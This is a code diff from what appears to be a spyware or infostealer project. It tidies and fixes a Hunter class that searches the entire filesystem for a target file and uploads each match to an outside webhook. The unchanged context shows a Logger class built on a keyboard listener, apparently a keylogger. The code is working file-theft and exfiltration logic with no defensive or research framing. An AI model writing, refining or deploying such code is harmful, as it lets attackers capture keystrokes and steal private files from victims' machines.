@@ -404,23 +404,22 @@ class Logger:
         with keyboard.Listener(on_press=on_press) as listener:
             listener.join()
 
-class Hunter: 
-    def __init__(self,filename,webhook_url,):
+class Hunter:
+    def __init__(self, filename, webhook_url):
         self.filename = filename
         self.webhook_url = webhook_url
+    
     def hunt_file(self):
-        search_path='/'
-        case_sensitive=True 
-        if not case_sensitive:
-            filename = self.filename.lower()
-
+        search_path = '/'
+        case_sensitive = True 
+        filename_file = self.filename.lower() if not case_sensitive else self.filename
+        
         def search_in_directory(directory):
             for root, _, files in os.walk(directory):
                 for file in files:
-                    if not case_sensitive:
-                        file = file.lower()
+                    file_check = file.lower() if not case_sensitive else file
 
-                    if file == filename:
+                    if file_check == filename_file:
                         return os.path.abspath(os.path.join(root, file))
             return None
 
@@ -432,9 +431,8 @@ class Hunter:
             for task in concurrent.futures.as_completed(search_tasks):
                 result = task.result()
                 if result:
-                    upload_files_instance = Upload_files(result,self.webhook_url)
+                    upload_files_instance = Upload_files(result, self.webhook_url)
                     upload_files_instance.webhook_upload()
-
 
         return None
 
